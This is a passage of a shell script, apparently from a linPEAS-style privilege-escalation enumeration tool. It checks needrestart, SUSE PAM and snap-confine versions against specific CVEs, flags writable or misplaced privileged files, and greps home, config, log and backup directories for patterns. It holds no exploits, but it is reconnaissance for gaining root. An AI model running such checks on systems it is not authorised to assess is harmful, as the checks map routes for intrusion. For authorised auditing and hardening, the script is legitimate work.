    [ -n "$nr48990_config_file_value" ] && nr48990_config="$nr48990_config_file_value"
  done
  printf '%s' "$nr48990_config"
}
checkNeedrestartCVE202448990() {
  nr48990_root="${ROOT_FOLDER:-/}"
  case "$nr48990_root" in
    */) ;;
    *) nr48990_root="${nr48990_root}/" ;;
  esac
  nr48990_binary=""
  if [ "$nr48990_root" = "/" ]; then
    nr48990_binary="$(command -v needrestart 2>/dev/null)"
  else
    for nr48990_binary_candidate in usr/sbin/needrestart usr/bin/needrestart sbin/needrestart bin/needrestart; do
      if [ -f "${nr48990_root}${nr48990_binary_candidate}" ]; then
        nr48990_binary="${nr48990_root}${nr48990_binary_candidate}"
        break
      fi
    done
  fi
  nr48990_full_version=""
  nr48990_manager=""
  if command -v dpkg-query >/dev/null 2>&1; then
    nr48990_dpkg_record="$(dpkg-query --admindir="${nr48990_root}var/lib/dpkg" -W -f='$''{Status}|$''{Version}\n' needrestart 2>/dev/null | head -n1)"
    case "$nr48990_dpkg_record" in
      "install ok installed|"*)
        nr48990_full_version="${nr48990_dpkg_record#*|}"
        [ -n "$nr48990_full_version" ] && nr48990_manager="dpkg"
        ;;
    esac
  fi
  if [ -z "$nr48990_full_version" ] && command -v rpm >/dev/null 2>&1; then
    if nr48990_rpm_record="$(rpm --root "$nr48990_root" -q --qf '%{VERSION}-%{RELEASE}\n' needrestart 2>/dev/null)"; then
      nr48990_full_version="$(printf '%s\n' "$nr48990_rpm_record" | head -n1)"
      [ -n "$nr48990_full_version" ] && nr48990_manager="rpm"
    fi
  fi
  [ -n "$nr48990_binary" ] || [ -n "$nr48990_full_version" ] || return 0
  print_3title "Needrestart interpreter-scanner LPE (CVE-2024-48990)" "T1068"
  print_info "https://ubuntu.com/security/CVE-2024-48990"
  nr48990_os_release="${nr48990_root}etc/os-release"
  nr48990_distro_id="$(sed -nE 's/^ID="?([^" ]+)"?$/\1/p' "$nr48990_os_release" 2>/dev/null | head -n1)"
  nr48990_codename="$(sed -nE 's/^VERSION_CODENAME="?([^" ]+)"?$/\1/p' "$nr48990_os_release" 2>/dev/null | head -n1)"
  nr48990_ubuntu_codename="$(sed -nE 's/^UBUNTU_CODENAME="?([^" ]+)"?$/\1/p' "$nr48990_os_release" 2>/dev/null | head -n1)"
  if [ -n "$nr48990_ubuntu_codename" ]; then
    nr48990_distro_id="ubuntu"
    nr48990_codename="$nr48990_ubuntu_codename"
  fi
  nr48990_upstream_version="$(lp_extract_upstream_version "$nr48990_full_version")"
  nr48990_interpscan="$(nr48990_effective_interpscan "$nr48990_root")"
  nr48990_dpkg_fixed=""
  nr48990_status="unknown"
  if [ "$nr48990_manager" = "dpkg" ] && command -v dpkg >/dev/null 2>&1; then
    nr48990_dpkg_fixed="$(nr48990_fixed_dpkg_version "$nr48990_distro_id" "$nr48990_codename")"
    if [ -n "$nr48990_dpkg_fixed" ]; then
      if dpkg --compare-versions "$nr48990_full_version" lt "$nr48990_dpkg_fixed"; then
        nr48990_status="affected"
      else
        nr48990_status="fixed"
      fi
    fi
  fi
  if [ "$nr48990_status" = "unknown" ] && [ -n "$nr48990_upstream_version" ]; then
    if lp_version_lt "$nr48990_upstream_version" "3.8"; then
      nr48990_status="potential"
    else
      nr48990_status="fixed"
    fi
  fi
  echo "needrestart package: ${nr48990_full_version:-version unknown}${nr48990_manager:+ ($nr48990_manager)}" | sed -${E} "s,.*,${SED_LIGHT_CYAN},"
  if [ -n "$nr48990_dpkg_fixed" ]; then
    echo "Vendor fixed version for ${nr48990_distro_id:-unknown} ${nr48990_codename:-unknown}: $nr48990_dpkg_fixed"
  fi
  case "$nr48990_status:$nr48990_interpscan" in
    affected:0|potential:0)
      echo "Affected needrestart version detected, but the official interpscan=0 mitigation is active; update is still recommended" | sed -${E} "s,.*,${SED_YELLOW},"
      ;;
    affected:*)
      echo "VULNERABLE to CVE-2024-48990: needrestart $nr48990_full_version is below the vendor fixed version and interpreter scanning is enabled" | sed -${E} "s,.*,${SED_RED_YELLOW},"
      ;;
    potential:*)
      echo "Potentially vulnerable to CVE-2024-48990: upstream needrestart $nr48990_upstream_version is before 3.8 and interpreter scanning is enabled; verify distro backports" | sed -${E} "s,.*,${SED_RED_YELLOW},"
      ;;
    fixed:*)
      echo "needrestart $nr48990_full_version is not vulnerable to CVE-2024-48990 according to the known vendor/upstream fixed version" | sed -${E} "s,.*,${SED_GREEN},"
      ;;
    unknown:0)
      echo "needrestart is present; version is unknown, but the interpscan=0 mitigation is active" | sed -${E} "s,.*,${SED_YELLOW},"
      ;;
    *)
      echo "needrestart is present with interpreter scanning enabled, but its version could not be assessed" | sed -${E} "s,.*,${SED_RED_YELLOW},"
      ;;
  esac
  echo "Effective interpreter scanning: $nr48990_interpscan (0=disabled mitigation, 1=enabled/default)"
  echo ""
}

checkPamAllowActiveCVE20256018() { (
  [ "$(uname -s 2>/dev/null)" = Linux ] || return 0
  pa6018_root="${ROOT_FOLDER:-/}"
  case "$pa6018_root" in */) ;; *) pa6018_root="$pa6018_root/" ;; esac
  pa6018_os="${pa6018_root}etc/os-release"
  [ -r "$pa6018_os" ] || return 0
  pa6018_id="$(sed -n '1,100{s/^ID=[" ]*\([^" ]*\).*/\1/p;};101q' "$pa6018_os" | head -n 1)"
  pa6018_version="$(sed -n '1,100{s/^VERSION_ID=[" ]*\([^" ]*\).*/\1/p;};101q' "$pa6018_os" | head -n 1)"
  case "$pa6018_id:$pa6018_version" in
    sles:15*|sled:15*|opensuse-leap:15*|opensuse:15*) ;;
    *) return 0 ;;
  esac
  pa6018_auth="${pa6018_root}etc/pam.d/common-auth"
  pa6018_session="${pa6018_root}etc/pam.d/common-session"
  pa6018_sshd="${pa6018_root}etc/pam.d/sshd"
  [ -r "$pa6018_auth" ] && [ -r "$pa6018_session" ] && [ -r "$pa6018_sshd" ] || return 0
  # Inspect only the named SSH stack files. A user supplied PAM environment is
  # relevant only when pam_env precedes pam_systemd in this stack.
  sed -n '1,200p;201q' "$pa6018_sshd" | grep -Eq '^[[:space:]]*(auth[[:space:]]+(include|substack)[[:space:]]+common-auth|@include[[:space:]]+common-auth)' || return 0
  sed -n '1,200p;201q' "$pa6018_sshd" | grep -Eq '^[[:space:]]*(session[[:space:]]+(include|substack)[[:space:]]+common-session|@include[[:space:]]+common-session)' || return 0
  pa6018_env_line="$(sed -n '1,200p;201q' "$pa6018_auth" | grep -E '^[[:space:]]*auth[[:space:]].*pam_env[.]so([[:space:]]|$)' | head -n 1)"
  [ -n "$pa6018_env_line" ] || return 0
  sed -n '1,200p;201q' "$pa6018_session" | grep -Eq '^[[:space:]]*session[[:space:]].*pam_systemd[.]so([[:space:]]|$)' || return 0
  if printf '%s\n' "$pa6018_env_line" | grep -Eq '(^|[[:space:]])user_readenv=0($|[[:space:]])'; then
    return 0
  elif printf '%s\n' "$pa6018_env_line" | grep -Eq '(^|[[:space:]])user_readenv=1($|[[:space:]])'; then
    pa6018_config="explicit user_readenv=1"
  else
    pa6018_config="implicit user_readenv; effective default unknown"
  fi
  pa6018_pam="unknown"
  pa6018_pam_config="unknown"
  if command -v timeout >/dev/null 2>&1 && command -v rpm >/dev/null 2>&1; then
    pa6018_pam="$(timeout 3 rpm --root "$pa6018_root" -q --qf '%{VERSION}-%{RELEASE}\n' pam 2>/dev/null | awk 'NR == 1 && /^[0-9]/ { print }')"
    [ -n "$pa6018_pam" ] || pa6018_pam="unknown"
    pa6018_pam_config="$(timeout 3 rpm --root "$pa6018_root" -q --qf '%{VERSION}-%{RELEASE}\n' pam-config 2>/dev/null | awk 'NR == 1 && /^[0-9]/ { print }')"
    [ -n "$pa6018_pam_config" ] || pa6018_pam_config="unknown"
  fi
  pa6018_status="unknown"
  case "$pa6018_id:$pa6018_version" in
    sles:15.6|sles:15.7|sled:15.6|sled:15.7|opensuse-leap:15.6|opensuse:15.6)
      if [ "$pa6018_config" = "explicit user_readenv=1" ]; then
        # The PAM update changes the default; an explicit setting overrides it.
        pa6018_status="explicit user_readenv=1 in the effective auth stack"
      elif lp_suse_numeric_version_lt "$pa6018_pam" "1.3.0-150000.6.83.1"; then
        # The package that controls pam_env's default is below SUSE's fix.
        # The actual stack still has pam_env in auth, regardless of whether
        # a newer pam-config package has been installed since it was written.
        pa6018_status="pam below SUSE fixed package version"
      else
        return 0
      fi
      ;;
    *) return 0 ;;
  esac
  print_3title "SUSE PAM allow_active path (CVE-2025-6018)" "T1068"
  print_info "https://www.suse.com/security/cve/CVE-2025-6018.html"
  echo "SSH includes common-auth and common-session; common-auth loads pam_env before common-session loads pam_systemd"
  echo "pam_env: $pa6018_config; pam package: $pa6018_pam; pam-config package: $pa6018_pam_config"
  echo "Package evidence: $pa6018_status; effective patch status: unknown, verify vendor advisories and PAM configuration"
  echo ""
) ; }

warn_exec(){
  $* 2>/dev/null || echo_not_found $1
}

check_privileged_file_location() {
  priv_file_type="$1"
  priv_file_name="$2"
  priv_file_owner="$3"
  priv_file_unusual=""
  case "$priv_file_name" in
    "${ROOT_FOLDER}tmp/"*|"${ROOT_FOLDER}var/tmp/"*|"${ROOT_FOLDER}dev/shm/"*|"${ROOT_FOLDER}run/user/"*|"${ROOT_FOLDER}var/run/user/"*|"${ROOT_FOLDER}home/"*)
      echo "$priv_file_type file in a user-writable or unusual location: $priv_file_name" | sed -${E} "s,.*,${SED_RED_YELLOW},"
      priv_file_unusual="1"
      ;;
  esac
  if [ "$priv_file_owner" = root ] && [ -f "$priv_file_name" ] && [ ! -L "$priv_file_name" ] && [ -x "$priv_file_name" ]; then
    while IFS= read -r priv_backup_dest; do
      [ -n "$priv_backup_dest" ] || continue
      case "$priv_file_name" in
        "$priv_backup_dest"/*)
          priv_backup_opts=$(pgbb_mount_options "$priv_file_name")
          case ",$priv_backup_opts," in ,,|*,nosuid,*|*,noexec,*) continue ;; esac
          echo "$priv_file_type root-owned file under a reviewed PostgreSQL backup destination: $priv_file_name" | sed -${E} "s,.*,${SED_RED_YELLOW},"
          priv_file_unusual=1
          break
          ;;
      esac
    done <<EOF_PRIV_BACKUP_DESTS
$PG_BASEBACKUP_DESTS
EOF_PRIV_BACKUP_DESTS
  fi
  priv_file_parent="$(dirname "$priv_file_name")"
  if ! [ "$IAMROOT" ] && [ -d "$priv_file_parent" ] && [ -w "$priv_file_parent" ] && [ -x "$priv_file_parent" ] && ! [ -k "$priv_file_parent" ]; then
    echo "You can replace entries in the $priv_file_type file's parent directory: $priv_file_parent" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  fi
  if [ "$priv_file_owner" ] && [ "$priv_file_owner" != "root" ]; then
    echo "$priv_file_type file is owned by non-root user $priv_file_owner: $priv_file_name" | sed -${E} "s,.*,${SED_RED},"
  fi
  if [ "$priv_file_unusual" ] && find "$priv_file_name" -mtime -7 -print 2>/dev/null | grep -q .; then
    echo "$priv_file_type file in an unusual location was modified in the last 7 days: $priv_file_name" | sed -${E} "s,.*,${SED_RED},"
  fi
}

checkSnapConfineCVE20263888() {
  sc3888_root="${ROOT_FOLDER:-/}"
  case "$sc3888_root" in */) ;; *) sc3888_root="${sc3888_root}/" ;; esac
  sc3888_path="${sc3888_root}usr/lib/snapd/snap-confine"
  [ -f "$sc3888_path" ] || return 0
  sc3888_priv=""
  if [ -u "$sc3888_path" ]; then
    sc3888_priv="setuid"
  elif command -v getcap >/dev/null 2>&1 &&
       getcap "$sc3888_path" 2>/dev/null | grep -q 'cap_sys_admin'; then
    sc3888_priv="file capabilities"
  fi
  [ -n "$sc3888_priv" ] || return 0
  sc3888_release="$(sed -n 's/^VERSION_ID="\{0,1\}\([0-9][0-9.]*\)"\{0,1\}$/\1/p' "${sc3888_root}etc/os-release" 2>/dev/null | head -n 1)"
  sc3888_version=""
  if command -v dpkg-query >/dev/null 2>&1; then
    sc3888_version="$(dpkg-query --admindir="${sc3888_root}var/lib/dpkg" -W -f='$''{Status} $''{Version}\n' snapd 2>/dev/null | awk 'NR==1 && $1=="install" && $2=="ok" && $3=="installed" {print $4; exit}')"
  fi
  sc3888_fixed=""
  case "$sc3888_release" in
    16.04) sc3888_fixed="2.61.4ubuntu0.16.04.1+esm2" ;;
    18.04) sc3888_fixed="2.61.4ubuntu0.18.04.1+esm2" ;;
    20.04) sc3888_fixed="2.67.1+20.04ubuntu1~esm1" ;;
    22.04) sc3888_fixed="2.73+ubuntu22.04.1" ;;
    24.04) sc3888_fixed="2.73+ubuntu24.04.2" ;;
    25.10) sc3888_fixed="2.73+ubuntu25.10.1" ;;
    26.04) sc3888_fixed="2.74.1+ubuntu26.04.3" ;;
  esac
  sc3888_state="unknown"
  # Compare complete Debian versions only for Ubuntu packages on a known release.
  # A local rebuild, epoch, or unexpected suffix can contain a backported fix.
  if grep -q '^ID=\("\{0,1\}\)ubuntu\1$' "${sc3888_root}etc/os-release" 2>/dev/null &&
     [ -n "$sc3888_version" ] && [ -n "$sc3888_fixed" ] &&
     command -v dpkg >/dev/null 2>&1; then
    case "$sc3888_version" in
      *"$sc3888_release"*|*"ubuntu${sc3888_release}"*)
        if dpkg --compare-versions "$sc3888_version" ge "$sc3888_fixed"; then
          sc3888_state="at-or-above-fix"
        else
          sc3888_state="below-fix"
        fi
        ;;
    esac
  fi
  # Inspect the usual effective tmp.conf by directory precedence. Other rule
  # names and runtime unit state need a full tmpfiles/systemd evaluation.
  sc3888_rule=""
  for sc3888_dir in etc run usr/local/lib usr/lib lib; do
    if [ -r "${sc3888_root}${sc3888_dir}/tmpfiles.d/tmp.conf" ]; then
      sc3888_rule="${sc3888_root}${sc3888_dir}/tmpfiles.d/tmp.conf"
      break
    fi
  done
  sc3888_age=""
  if [ -n "$sc3888_rule" ]; then
    sc3888_age="$(awk 'NR > 100 {exit} $1 ~ /^[dDqQ][!~+=-]*$/ && $2 == "/tmp" && $6 ~ /^[0-9]+[smhdwMy]*$/ {print $6; exit}' "$sc3888_rule" 2>/dev/null)"
  fi
  sc3888_timer="unit not found"
  if [ -e "${sc3888_root}usr/lib/systemd/system/systemd-tmpfiles-clean.timer" ] ||
     [ -e "${sc3888_root}lib/systemd/system/systemd-tmpfiles-clean.timer" ]; then
    sc3888_timer="unit present; runtime activation unverified"
  fi
  if [ -e "${sc3888_root}etc/systemd/system/timers.target.wants/systemd-tmpfiles-clean.timer" ]; then
    sc3888_timer="enable link present; runtime activation unverified"
  fi
  print_3title "snap-confine/tmpfiles race prerequisites (CVE-2026-3888)" "T1068"
  print_info "https://ubuntu.com/security/CVE-2026-3888"
  echo "snap-confine: $sc3888_priv ($sc3888_path)"
  echo "snapd package: ${sc3888_version:-unknown}; Ubuntu release: ${sc3888_release:-unknown}"
  case "$sc3888_state" in
    at-or-above-fix) echo "Package version is at or above the Ubuntu advisory fix ($sc3888_fixed); verify local package provenance" ;;
    below-fix) echo "Package version is below the Ubuntu advisory fix ($sc3888_fixed); verify backports" ;;
    *) echo "Package fix status unclassified; verify distribution patches and package provenance" ;;
  esac
  if [ -n "$sc3888_age" ]; then
    echo "/tmp cleanup rule: age $sc3888_age ($sc3888_rule)"
  else
    echo "/tmp cleanup rule: not confirmed in standard tmp.conf locations"
  fi
  echo "systemd-tmpfiles-clean.timer: $sc3888_timer"
  if [ "$sc3888_state" = "below-fix" ] && [ -n "$sc3888_age" ] &&
     [ "$sc3888_timer" != "unit not found" ]; then
    echo "Potential CVE-2026-3888 prerequisites observed; timer activity, snap layout, and backports remain unverified" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  fi
  echo ""
}

sc8933_version_ge() {
  [ -n "$1" ] && [ -n "$2" ] || return 1
  if command -v dpkg >/dev/null 2>&1; then
    dpkg --compare-versions "$1" ge "$2"
  else
    [ "$(printf '%s\n%s\n' "$1" "$2" | sort -V 2>/dev/null | tail -n1)" = "$1" ]
  fi
}
sc8933_version_lt() {
  [ -n "$1" ] && [ -n "$2" ] || return 1
  if command -v dpkg >/dev/null 2>&1; then
    dpkg --compare-versions "$1" lt "$2"
  else
    [ "$1" != "$2" ] && [ "$(printf '%s\n%s\n' "$1" "$2" | sort -V 2>/dev/null | head -n1)" = "$1" ]
  fi
}
sc8933_version_is_vulnerable() {
  sc8933_version="$1"
  sc8933_kind="$2"
  sc8933_os_release="$3"
  sc8933_upstream="$(lp_extract_upstream_version "$sc8933_version")"
  # The upstream affected range is >= 2.75.0 and < 2.76.1. Ubuntu fixed
  # 2.76 with release-specific backports, so compare the complete dpkg version.
  sc8933_version_ge "$sc8933_upstream" "2.75" || return 1
  if [ "$sc8933_kind" = "deb" ]; then
    sc8933_fixed=""
    case "$sc8933_os_release" in
      22.04) sc8933_fixed="2.76+ubuntu22.04.1" ;;
      24.04) sc8933_fixed="2.76+ubuntu24.04.1" ;;
      26.04) sc8933_fixed="2.76+ubuntu26.04.3" ;;
    esac
    if [ -n "$sc8933_fixed" ]; then
      sc8933_version_lt "$sc8933_version" "$sc8933_fixed"
      return
    fi
  fi
  sc8933_version_lt "$sc8933_upstream" "2.76.1"
}
checkSnapConfineCVE20268933() {
  command -v getcap >/dev/null 2>&1 || return
  sc8933_root="${ROOT_FOLDER:-/}"
  case "$sc8933_root" in
    */) ;;
    *) sc8933_root="${sc8933_root}/" ;;
  esac
  sc8933_os_id="$(sed -nE 's/^ID="?([^" ]+)"?$/\1/p' "${sc8933_root}etc/os-release" 2>/dev/null | head -n1)"
  sc8933_os_release="$(sed -nE 's/^VERSION_ID="?([^" ]+)"?$/\1/p' "${sc8933_root}etc/os-release" 2>/dev/null | head -n1)"
  sc8933_reported=""
  for sc8933_path in \
    "${sc8933_root}usr/lib/snapd/snap-confine" \
    "${sc8933_root}snap/snapd/current/usr/lib/snapd/snap-confine"; do
    [ -f "$sc8933_path" ] || continue
    [ -u "$sc8933_path" ] && continue
    sc8933_caps="$(getcap "$sc8933_path" 2>/dev/null)"
    printf '%s' "$sc8933_caps" | grep -q 'cap_sys_admin' || continue
    if [ -z "$sc8933_reported" ]; then
      print_3title "Set-capabilities snap-confine (CVE-2026-8933)" "T1068"
      print_info "https://ubuntu.com/security/CVE-2026-8933"
      sc8933_reported="1"
    fi
    sc8933_kind="snap"
    sc8933_yaml="${sc8933_root}snap/snapd/current/meta/snap.yaml"
    sc8933_version=""
    case "$sc8933_path" in
      */usr/lib/snapd/snap-confine)
        if [ "$sc8933_path" = "${sc8933_root}usr/lib/snapd/snap-confine" ]; then
          sc8933_kind="deb"
          if command -v dpkg-query >/dev/null 2>&1; then
            sc8933_version="$(dpkg-query --admindir="${sc8933_root}var/lib/dpkg" -W -f='$''{Version}\n' snapd 2>/dev/null | head -n1)"
          fi
        elif [ -r "$sc8933_yaml" ]; then
          sc8933_version="$(sed -nE "s/^version:[[:space:]]*['\"]?([^'\"[:space:]]+).*/\1/p" "$sc8933_yaml" 2>/dev/null | head -n1)"
        fi
        ;;
    esac
    echo "$sc8933_caps" | sed -${E} "s,.*,${SED_LIGHT_CYAN},"
    if [ -z "$sc8933_version" ]; then
      echo "Potential CVE-2026-8933 exposure: privileged snap-confine uses file capabilities; version could not be determined" | sed -${E} "s,.*,${SED_RED_YELLOW},"
    elif [ "$sc8933_os_id" != "ubuntu" ] && [ "$sc8933_kind" = "deb" ]; then
      if sc8933_version_is_vulnerable "$sc8933_version" "$sc8933_kind" "$sc8933_os_release"; then
        echo "snap-confine version $sc8933_version uses file capabilities and is in the upstream CVE-2026-8933 range; verify distro backports" | sed -${E} "s,.*,${SED_RED_YELLOW},"
      else
        echo "snap-confine version $sc8933_version is not in the known CVE-2026-8933 vulnerable range" | sed -${E} "s,.*,${SED_GREEN},"
      fi
    elif sc8933_version_is_vulnerable "$sc8933_version" "$sc8933_kind" "$sc8933_os_release"; then
      echo "Vulnerable to CVE-2026-8933: set-capabilities snap-confine version $sc8933_version permits local privilege escalation to root" | sed -${E} "s,.*,${SED_RED_YELLOW},"
    else
      echo "snap-confine version $sc8933_version is not in the known CVE-2026-8933 vulnerable range" | sed -${E} "s,.*,${SED_GREEN},"
    fi
  done
  if [ -n "$sc8933_reported" ]; then
    echo ""
  fi
}

check_critial_root_path(){
  folder_path="$1"
  if [ -w "$folder_path" ]; then echo "You have write privileges over $folder_path" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
  folder_writable_files=$(find "$folder_path" -type f '(' '(' -user "$USER" ')' -or '(' -perm -o=w ')' -or '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null) || :
  if [ "$folder_writable_files" ]; then echo "You have write privileges over $folder_writable_files" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
  folder_nonroot_files=$(find "$folder_path" -type f -not -user root 2>/dev/null) || :
  if [ "$folder_nonroot_files" ]; then echo "The following files aren't owned by root: $folder_nonroot_files"; fi
}

macosNotSigned(){
  for f in $1/*; do
    if codesign -vv -d \"$f\" 2>&1 | grep -q 'not signed'; then
      echo "$f isn't signed" | sed -${E} "s,.*,${SED_RED},"
    fi
  done
}

search_for_regex(){
    title=$1
    regex=$2
    caseSensitive=$3
    if [ "$caseSensitive" ]; then
        i="i"
    else
        i=""
    fi
    print_3title_no_nl "Searching $title..."
    if [ "$SEARCH_IN_FOLDER" ]; then
        timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
    else
        # Search in home direcoties (usually the slowest)
        timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        # Search in etc
        timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        # Search in opt
        timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        # Search in possible web folders (usually only 1 will exist)
        timeout 120 find /var/www /usr/local/www /usr/share/nginx /Library/WebServer/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        # Search in logs
        timeout 120 find /var/log /var/logs /Library/Logs -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        # Search in backups
        timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        # Search in others folders (usually only /srv or /Applications will exist)
        timeout 120 find /tmp /srv /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
    fi
    wait
    printf "\033[2K\r"
}




